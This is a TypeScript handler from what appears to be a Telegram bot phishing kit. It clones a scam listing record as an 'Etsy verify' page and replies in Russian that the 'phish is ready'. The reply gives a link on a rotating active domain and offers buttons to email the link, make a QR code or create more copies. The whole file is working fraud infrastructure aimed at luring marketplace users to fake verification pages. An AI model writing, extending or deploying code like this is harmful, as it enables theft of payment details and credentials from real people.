import {Context} from "@/database/models/context";
import {Composer, InlineKeyboard} from "grammy";
import {adsRepository, domensRepository} from "@/database";
import {getFlagEmoji} from "@/helpers/getFlagEmoji";
import {Ads} from "@/database/models/ads";
import {User} from "@/database/models/user";
import {getPictureMenu} from "@/helpers/getPictureMenu";
import moment from "moment";

export const composer = new Composer<Context>()
composer.callbackQuery(/^etsy verify copy (?<id>\d+)$/, handler)

async function handler(ctx: Context)  {
    const mainAd = await adsRepository.findOne({
        relations: { author: true },
        where: {
            id: Number(ctx.match[1])
        },
    })

    if (!mainAd) return ctx.reply('ad undefined')
    const domen = await domensRepository.findOneBy({active: true, service: `etsy`})

    const date = Date.now()
    const ad = new Ads()
    ad.price = mainAd.price
    ad.title = mainAd.title
    ad.description = mainAd.description
    ad.img = mainAd.img
    ad.link = `2333383018-${date}`
    ad.originallink = 'none'
    ad.deliveryPrice = "null"
    ad.date = `${date}`
    ad.underService = 'verify'
    ad.country = mainAd.country
    ad.service = 'etsy'
    ad.author = ctx.user
    ad.manualCreation = true
    await adsRepository.save(ad)

    return ctx.replyWithPhoto(await getPictureMenu(ctx.user), {
        caption:`
Фиш готов 👌

🆔 ID: <code>${ad.date}</code>

📦 <b>Магазин:</b> <code>${ad.title}</code>
💡 <b>Платформа: ETSY VERIFY [${ctx.session.country.toUpperCase()} ${getFlagEmoji(ctx.session.country)}]</b>
♻️ <b>Домен сменён ${moment(new Date(domen.dateChange)).fromNow()}</b>
➖➖➖➖➖➖➖
🌠 <b>Созданные ссылки:</b> <a href="https://${domen.link}/link/${ad.link}">LINK [2.0]</a>
➖➖➖➖➖➖➖
<code>https://${domen.link}/link/${ad.link}</code>
`.replace('\n', ''),
        reply_markup: await createKeyboard(ad.id, ctx.user)
    })

}

const createKeyboard = async (id: Number, user: User) => {
    const keyb = new InlineKeyboard()
    // .text("🙊 Настройки", `settings ad ${id}`)

    keyb.row()
    keyb.text("💌 EMAIL", `email ad ${id}`)
    keyb.text("🎲 QR-code", `qrcode get ${id}`)
    keyb.row()
    keyb.text("🖇 Создать копию", `etsy verify copy ${id}`)
    keyb.row()
    keyb.text("Главное меню", `menuWithPicture`)

    return keyb
}
